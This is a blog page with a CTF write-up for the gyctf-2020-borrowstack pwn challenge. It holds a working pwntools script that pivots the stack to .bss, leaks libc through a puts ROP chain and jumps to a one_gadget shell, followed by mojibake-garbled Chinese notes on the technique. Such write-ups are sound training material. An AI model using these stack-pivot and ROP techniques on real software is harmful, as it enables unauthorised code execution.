<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            gyctf-2020-borrowstack |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        gyctf-2020-borrowstack
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                                    <span class="author-badge">Lv3</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-07-29 10:28:09</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Thu Aug 14 2025 20:55:43 GMT+0800">2025-08-14 20:55:43</span>
                </span>
            
        

        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/BUU/">BUU</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/one-gadget/">one_gadget</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182130118.png"  alt="image-20250727182130118"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182152629.png"  alt="image-20250727182152629"></p>
<p>æ€è·¯ï¼š</p>
<p>è®©åœ¨bankä¸Šæ„é€ ropé“¾ï¼Œé€šè¿‡bufè·³è½¬è¿‡å»ï¼Œæ³„éœ²libcæ‰¾åˆ°one_gadget</p>
<h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p=process(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,27049)</span><br><span class="line">elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">bank=0x0000000000601080</span><br><span class="line">leave=0x400699</span><br><span class="line">rdi=0x0400703</span><br><span class="line">ret=0x4004c9</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">main=0x400626</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)</span><br><span class="line">p.recvuntil(b&quot;want&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;now!&quot;)</span><br><span class="line">payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">a=p.recvline()</span><br><span class="line">puts= u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base=puts-libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x68+p64(one)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h2><h3 id="å‡½æ•°è·³è½¬"><a href="#å‡½æ•°è·³è½¬" class="headerlink" title="å‡½æ•°è·³è½¬"></a>å‡½æ•°è·³è½¬</h3><p>ç¬¬ä¸€æ®µ payload æ˜¯å‘ç”Ÿåœ¨ <strong>ç¬¬ä¸€æ¬¡ <code>read()</code></strong>ï¼Œå®ƒè™½ç„¶åŠ«æŒäº† <code>rbp</code> å’Œè¿”å›åœ°å€ï¼Œä½†ç¨‹åºè¿˜åœ¨ <code>vuln()</code> å‡½æ•°é‡Œã€‚</p>
<ul>
<li>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>ä½ æ‰§è¡Œå®Œ <code>read()</code> åï¼Œè¿˜æ²¡ leaveã€è¿˜æ²¡ retï¼</strong></li>
<li>ç„¶åç»§ç»­æ‰§è¡Œ <code>puts(&quot;now!&quot;)</code> å’Œç¬¬äºŒä¸ª <code>read()</code>ã€‚</li>
<li><strong>ç¬¬äºŒä¸ª <code>read()</code> è¿™æ—¶å€™è¯»å–çš„ç›®æ ‡è¿˜æ˜¯ <code>buf</code>ï¼Œä½†æ˜¯ <code>rsp</code> å·²ç»å˜æˆ <code>.bss</code></strong>ï¼ˆä½ é€šè¿‡ <code>rbp=bank</code>, ä¹‹åå†æ‰§è¡Œ <code>leave</code> å®ç°çš„ï¼‰ã€‚</li>
</ul>
<p>ğŸ” æ€ä¹ˆç†è§£æ ˆè¿ç§»åè¿˜èƒ½ readï¼Ÿ</p>
<p>ä½ ç¬¬ä¸€æ¬¡å‘é€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x60 + p64(bank) + p64(leave)</span><br></pre></td></tr></table></figure>

<p>ä½†è¿™æ®µ payload <strong>ä¸æ˜¯ç«‹å³æ‰§è¡Œçš„ï¼</strong></p>
<blockquote>
<p>å®ƒåªæ˜¯<strong>è¢« read è¯»å–åˆ°äº†æ ˆä¸Šçš„ buf ä¸­ï¼Œè¦†ç›–äº†åŸæ¥çš„è¿”å›åœ°å€ï¼ˆretï¼‰å’Œ rbp è€Œå·²ã€‚</strong></p>
</blockquote>
<ul>
<li><code>read()</code> å‡½æ•°ç»“æŸ â†’ å‡½æ•°æ ˆç»§ç»­æ‰§è¡Œ â†’ æ‰§è¡Œ <code>puts(&quot;now!&quot;)</code></li>
<li>æ‰§è¡Œç¬¬äºŒä¸ª <code>read()</code>ï¼Œç¨‹åºæ‰åœä¸‹æ¥ç­‰å¾…è¾“å…¥</li>
<li>ç›´åˆ° <code>vuln()</code> å‡½æ•° returnï¼Œleave å’Œ ret æ‰ä¼šè¢«æ‰§è¡Œï¼</li>
</ul>
<p><strong>ğŸ§  å®é™…æµç¨‹å¦‚ä¸‹ï¼š</strong></p>
<ol>
<li>ç¬¬ä¸€æ¬¡ <code>read</code> è¯»å–ä½ çš„ç¬¬ä¸€ä¸ª payloadï¼š<ul>
<li>è¦†ç›–äº† <code>rbp = bank</code></li>
<li>è¦†ç›–äº† <code>ret = leave</code></li>
</ul>
</li>
<li>ä½†ç¨‹åºå¹¶<strong>æ²¡æœ‰ç«‹åˆ»è·³è½¬</strong>ï¼Œå®ƒåªæ˜¯æŠŠ payload å†™å…¥ bufï¼Œç»§ç»­æ‰§è¡Œ vuln å‡½æ•°ï¼š<ul>
<li><code>puts(&quot;now!&quot;)</code></li>
<li>ç¬¬äºŒä¸ª <code>read()</code> ç­‰å¾…ä½ è¾“å…¥ï¼ˆæ­¤æ—¶ <code>rsp = buf</code>, ä½†å³å°†æ ˆè¿ç§»ï¼‰</li>
</ul>
</li>
<li>å‡½æ•°æ‰§è¡Œåˆ°ç»“å°¾ï¼Œå¼€å§‹æ‰§è¡Œ <code>leave; ret</code><ul>
<li>æŠŠ <code>rsp = bank</code>ï¼Œå¼€å§‹æ‰§è¡Œä½ å¸ƒç½®åœ¨ <code>.bss</code> ä¸Šçš„ç¬¬äºŒæ®µ ROP é“¾ï¼</li>
</ul>
</li>
</ol>
<p>âœ… æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡ payload å¹¶ä¸è®©ç¨‹åºè·³è½¬ï¼Œåªæ˜¯<strong>å¸ƒç½®å¥½äº†æ ˆè¿ç§»å‡†å¤‡</strong></p>
<p>ç¬¬äºŒæ¬¡ <code>read()</code> æ˜¯ç¨‹åºè‡ªå·±ç»§ç»­æ‰§è¡Œé€»è¾‘ä¸­è°ƒç”¨çš„ã€‚</p>
<h3 id="p64-ret-0x20"><a href="#p64-ret-0x20" class="headerlink" title="p64(ret)*0x20"></a>p64(ret)*0x20</h3><h4 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h4><p>å½“ <code>main</code> å‡½æ•°<strong>å†æ¬¡è¢«æ‰§è¡Œæ—¶</strong>ï¼ˆå› ä¸ºä½ çš„ ROP é“¾æœ€åè·³è½¬åˆ°äº† <code>main</code> å‡½æ•°çš„åœ°å€ï¼‰ï¼š</p>
<ol>
<li><p>ç¨‹åºä¼šä¸ºæ–°çš„ <code>main</code> å‡½æ•°è°ƒç”¨<strong>é‡æ–°åˆ†é…ä¸€ä¸ªæ ˆå¸§</strong>ã€‚</p>
</li>
<li><p>åœ¨è¿™ä¸ªæ–°çš„æ ˆå¸§ä¸­ï¼Œä¼š<strong>å†æ¬¡ä¸ºå±€éƒ¨å˜é‡ <code>buf[96]</code> åˆ†é…ç©ºé—´</strong>ã€‚</p>
</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆâ€œä¸´æ—¶å˜é‡çš„ç©ºé—´ä¼šè¦†ç›–åˆ° GOT è¡¨â€ï¼Ÿ</strong></p>
<p>è¿™é‡Œå°±æ˜¯å…³é”®ç‚¹ã€‚åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼ˆä»é«˜åœ°å€å‘ä½åœ°å€ï¼‰ã€‚</p>
<ul>
<li><strong>GOT è¡¨é€šå¸¸åœ¨ç¨‹åºçš„ä½åœ°å€åŒºåŸŸã€‚</strong> ï¼ˆä¾‹å¦‚ï¼š<code>0x0601018</code>ï¼‰</li>
<li><strong><code>bank</code> å˜é‡åœ¨ <code>.bss</code> æ®µï¼Œé€šå¸¸åœ°å€æ¯” GOT è¡¨é«˜ã€‚</strong> ï¼ˆä¾‹å¦‚ï¼š<code>0x0601080</code>ï¼‰</li>
<li><strong>æ ˆä¼šå‘ä¸‹å¢é•¿ã€‚</strong> å½“ <code>main</code> å‡½æ•°å†æ¬¡è¢«è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒåœ¨å †æ ˆä¸Šåˆ†é… <code>buf</code> ç­‰å±€éƒ¨å˜é‡æ—¶ï¼Œè¿™äº›å˜é‡ä¼šå ç”¨ <code>rsp</code> å‘ä¸‹å¢é•¿çš„å†…å­˜ç©ºé—´ã€‚</li>
</ul>
<p>ç°åœ¨æƒ³è±¡ä¸€ä¸‹ï¼š</p>
<ol>
<li>ä½ çš„æ ˆè¿ç§»ï¼ŒæŠŠ <code>rsp</code> è®¾ç½®åˆ°äº† <code>bank</code> å¤„ï¼ˆä¾‹å¦‚ <code>0x0601080</code>ï¼‰ã€‚</li>
<li>ä½ ç”¨ <code>p64(ret)*20</code> æŠŠä½ çš„ ROP é“¾æ¨åˆ°äº† <code>bank + 160</code> (ä¾‹å¦‚ <code>0x0601120</code>)ã€‚</li>
<li>ä½ çš„ ROP é“¾æ‰§è¡Œï¼Œæ³„æ¼ <code>puts</code> åœ°å€ã€‚</li>
<li>ç„¶åï¼Œä½ çš„ ROP é“¾æœ€åæ‰§è¡Œ <code>p64(main)</code>ï¼Œå¯¼è‡´ç¨‹åºè·³è½¬å› <code>main</code> å‡½æ•°çš„å¼€å¤´ã€‚</li>
<li><strong>å½“ <code>main</code> å‡½æ•°å†æ¬¡æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šåœ¨æ ˆä¸Šé‡æ–°åˆ†é…ç©ºé—´ã€‚</strong> æ­¤æ—¶ï¼Œ<strong>æ–°çš„æ ˆå¸§å¯èƒ½ä¼šä» <code>rsp</code> çš„å½“å‰ä½ç½®ï¼ˆå³ <code>0x0601120</code>ï¼Œä¹Ÿå°±æ˜¯ä½ çš„ ROP é“¾æœ€åæ‰§è¡Œå®Œçš„ä½ç½®ï¼‰å¼€å§‹å‘ä¸‹ï¼ˆå‘ä½åœ°å€ï¼‰å¢é•¿ã€‚</strong></li>
<li>å¦‚æœ <code>main</code> å‡½æ•°åˆ†é…çš„å±€éƒ¨å˜é‡ï¼ˆä¾‹å¦‚ <code>buf[96]</code>ï¼‰çš„<strong>æ–°ç©ºé—´</strong>ï¼Œåœ¨æ ˆå‘ä¸‹å¢é•¿çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>æ°å¥½â€œè¦†ç›–â€åˆ°äº† GOT è¡¨æ‰€åœ¨çš„å†…å­˜åŒºåŸŸ</strong>ï¼ˆä¾‹å¦‚ <code>0x0601018</code>ï¼‰ï¼Œé‚£ä¹ˆ GOT è¡¨çš„åœ°å€å°±ä¼šè¢«è¿™äº›å±€éƒ¨å˜é‡çš„åƒåœ¾æ•°æ®æ‰€ç ´åã€‚</li>
</ol>
<p><strong><code>p64(ret)*20</code> çš„ä½œç”¨</strong></p>
<p>æ‰€ä»¥ï¼Œ<code>p64(ret)*20</code> åœ¨è¿™é‡Œçš„å¦ä¸€ä¸ªé‡è¦ä½œç”¨å°±æ˜¯ï¼š</p>
<ul>
<li>å®ƒå°†ä½ çš„<strong>ä¼ªé€ æ ˆå¸§</strong>ï¼ˆå³ä½ å†™å…¥ <code>bank</code> çš„ ROP é“¾ï¼‰<strong>å‘é«˜åœ°å€æ–¹å‘æ¨å¾—æ›´è¿œ</strong>ã€‚</li>
<li>è¿™æ ·ï¼Œå½“ <code>main</code> å‡½æ•°å†æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä»ä½ ä¼ªé€ æ ˆçš„æœ«å°¾ï¼ˆ<code>bank + 160 + ROP é“¾é•¿åº¦</code>ï¼‰å¼€å§‹å‘ä¸‹åˆ†é…æ–°çš„æ ˆå¸§ã€‚</li>
<li>é€šè¿‡æŠŠä½ çš„ä¼ªé€ æ ˆï¼ˆå’Œ <code>rsp</code> çš„ä½ç½®ï¼‰è®¾ç½®åœ¨è¶³å¤Ÿé«˜çš„åœ°å€ï¼Œå¯ä»¥ç¡®ä¿ <code>main</code> å‡½æ•°å†æ¬¡åˆ†é…çš„å±€éƒ¨å˜é‡ç©ºé—´ï¼ˆæ ˆå‘ä¸‹å¢é•¿çš„éƒ¨åˆ†ï¼‰<strong>ä¸ä¼šä¾µçŠ¯åˆ°ä½äºä½åœ°å€çš„ GOT è¡¨</strong>ã€‚</li>
</ul>
<p><strong>ç”¨å›¾ç¤ºæ¥è¯´æ˜ï¼š</strong></p>
<p><strong>æ²¡æœ‰ <code>p64(ret)\*20</code> çš„é£é™©ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">é«˜åœ°å€</span><br><span class="line">...</span><br><span class="line">0x0601080 &lt;-- bank (rsp è¿ç§»åˆ°è¿™é‡Œ)</span><br><span class="line">| pop_rdi |</span><br><span class="line">| puts_got|  &lt;-- ROPé“¾</span><br><span class="line">| puts_plt|</span><br><span class="line">| main    |</span><br><span class="line">...</span><br><span class="line">0x0601018 &lt;-- puts_got (GOTè¡¨)</span><br><span class="line">...</span><br><span class="line">ä½åœ°å€</span><br><span class="line"></span><br><span class="line">å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒå¯èƒ½ä» 0x0601080 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ï¼Œ</span><br><span class="line">è¿™ä¸ª buf ç©ºé—´å¯èƒ½ç›´æ¥è¦†ç›–åˆ° 0x0601018 å¤„çš„ puts_gotã€‚</span><br></pre></td></tr></table></figure>

<p><strong>æœ‰äº† <code>p64(ret)\*20</code> çš„å¥½å¤„ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">é«˜åœ°å€</span><br><span class="line">...</span><br><span class="line">0x0601120 &lt;-- bank + 160 (rsp æœ€ç»ˆä¼šåˆ°è¿™é‡Œ)</span><br><span class="line">| pop_rdi |</span><br><span class="line">| puts_got|  &lt;-- ROPé“¾</span><br><span class="line">| puts_plt|</span><br><span class="line">| main    |</span><br><span class="line">...</span><br><span class="line">0x0601080 &lt;-- bank (rsp æœ€åˆè¿ç§»åˆ°è¿™é‡Œï¼Œp64(ret)*20 å¡«å……)</span><br><span class="line">| ret     |</span><br><span class="line">| ...     |</span><br><span class="line">| ret     |</span><br><span class="line">...</span><br><span class="line">0x0601018 &lt;-- puts_got (GOTè¡¨)</span><br><span class="line">...</span><br><span class="line">ä½åœ°å€</span><br><span class="line"></span><br><span class="line">å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒä¼šä» 0x0601120 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ã€‚</span><br><span class="line">ç”±äº 0x0601120 è¶³å¤Ÿé«˜ï¼Œå‘ä¸‹åˆ†é…çš„ buf ç©ºé—´ä¸ä¼šåˆ°è¾¾ 0x0601018 çš„ puts_gotã€‚</span><br><span class="line">GOTè¡¨å› æ­¤è¢«ä¿æŠ¤äº†ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œè¿™æ®µè§£é‡ŠæŒ‡çš„æ˜¯ï¼š<strong><code>p64(ret)\*20</code> èƒ½å¤Ÿå°†ä½ çš„ ROP é“¾çš„â€œèµ·ç‚¹â€æŠ¬é«˜ï¼Œä»è€Œé¿å…å½“ç¨‹åºå†æ¬¡å›åˆ° <code>main</code> å‡½æ•°å¹¶é‡æ–°åˆ†é…æ ˆç©ºé—´æ—¶ï¼Œ<code>main</code> å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼ˆå¦‚ <code>buf</code>ï¼‰åœ¨æ ˆå‘ä¸‹å¢é•¿æ—¶ï¼Œå…¶ç©ºé—´ä¸ <code>GOT</code> è¡¨å‘ç”Ÿé‡å ï¼Œè¿›è€Œç ´å <code>GOT</code> è¡¨ã€‚</strong></p>
<p>è¿™æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„ï¼Œä¹Ÿæ˜¯éå¸¸é‡è¦çš„é˜²å¾¡æ€§ç­–ç•¥ï¼Œç¡®ä¿äº†åç»­æ”»å‡»ï¼ˆä¾‹å¦‚è·å– Shellï¼‰çš„å¯é æ€§ï¼Œå› ä¸ºè¿™äº›æ”»å‡»é€šå¸¸éœ€è¦ä¸€ä¸ªå®Œå¥½æ— æŸçš„ <code>GOT</code> è¡¨æ¥è§£æå‡½æ•°åœ°å€ã€‚</p>
<h4 id="å¤§å°"><a href="#å¤§å°" class="headerlink" title="å¤§å°"></a>å¤§å°</h4><p>1.å¯ä»¥ä»ä¸€ä¸ªå°æ•°å¼€å§‹å°è¯•ï¼ˆæ¨èï¼‰</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹20å°±å¤Ÿäº†</p>
<ol start="2">
<li></li>
</ol>
<p>ä¸èƒ½å¤ªå¤§ï¼Œ <code>read(0, &amp;bank, 0x100uLL)</code> å†™å…¥çš„ã€‚è¿™ä¸ª <code>read</code> å‡½æ•°æœ€å¤šåªèƒ½è¯»å– <code>0x100</code> (256) å­—èŠ‚ã€‚</p>
<ul>
<li>ä½ çš„ <code>payload</code> é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚</li>
<li><code>p64(ret)*N</code> å æ®çš„å­—èŠ‚æ•°æ˜¯ <code>N * 8</code>ã€‚</li>
<li>ä½ çš„æ ¸å¿ƒ ROP é“¾ (<code>p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</code>) æœ¬èº«ä¹Ÿéœ€è¦ç©ºé—´ã€‚<ul>
<li><code>p64(pop_rdi)</code>: 8 å­—èŠ‚</li>
<li><code>p64(puts_got)</code>: 8 å­—èŠ‚</li>
<li><code>p64(puts_plt)</code>: 8 å­—èŠ‚</li>
<li><code>p64(main)</code>: 8 å­—èŠ‚</li>
<li>æ ¸å¿ƒ ROP é“¾å…± <code>4 * 8 = 32</code> å­—èŠ‚ã€‚</li>
</ul>
</li>
</ul>
<p>å¦‚æœ <code>N</code> è¿‡å¤§ï¼Œä¾‹å¦‚ <code>N=100</code>ï¼Œé‚£ä¹ˆ <code>p64(ret)*100</code> å°±éœ€è¦ <code>100 * 8 = 800</code> å­—èŠ‚ã€‚è¿™å·²ç»è¿œè¿œè¶…è¿‡äº† <code>read</code> å‡½æ•°èƒ½è¯»å–çš„æœ€å¤§ <code>0x100</code> (256) å­—èŠ‚ã€‚</p>
<h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p><code>one_gadget</code> æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨äºåˆ†æ <code>libc</code> åº“æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­å¯ä»¥ç›´æ¥ç”¨äºè·å– shell çš„æŒ‡ä»¤åºåˆ—çš„åç§»é‡ã€‚</p>
<p>ä¸ä¼ ç»Ÿçš„ <code>system(&quot;/bin/sh&quot;)</code> æ–¹æ³•ç›¸æ¯”ï¼Œ<code>one_gadget</code> é€šå¸¸æ›´ç®€æ´ï¼Œå› ä¸ºå®ƒåªéœ€è¦ä¸€ä¸ªåœ°å€å°±èƒ½è·å– shellï¼Œè€Œä¸éœ€è¦ <code>pop_rdi</code> gadgetã€<code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€å’Œ <code>system</code> å‡½æ•°çš„åœ°å€ã€‚ æ­¤å¤–ï¼Œ<code>one_gadget</code> é€šå¸¸å¯¹ç¯å¢ƒï¼ˆåŒ…æ‹¬æ ˆå¯¹é½ï¼‰çš„è¦æ±‚æ›´å®½æ¾ã€‚</p>
<p>ç”¨æ³•å’Œshellcodeä¸€æ ·</p>
<p><strong>æ‰¾åˆ°ä½ç½®å³å¯</strong></p>
<p>æŠŠæ³„éœ²å‡ºæ¥çš„åœ°å€åœ¨<a class="link"   target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:690&l=libc6_2.23-0ubuntu11_amd64" >libcåŒ¹é…ç½‘ç«™<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163636808.png"  alt="image-20250727163636808"></p>
<p>ä¹‹åä¸‹è½½åŒ¹é…çš„çš„libcç‰ˆæœ¬</p>
<p>ç”¨å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163729001.png"  alt="image-20250727163729001"></p>
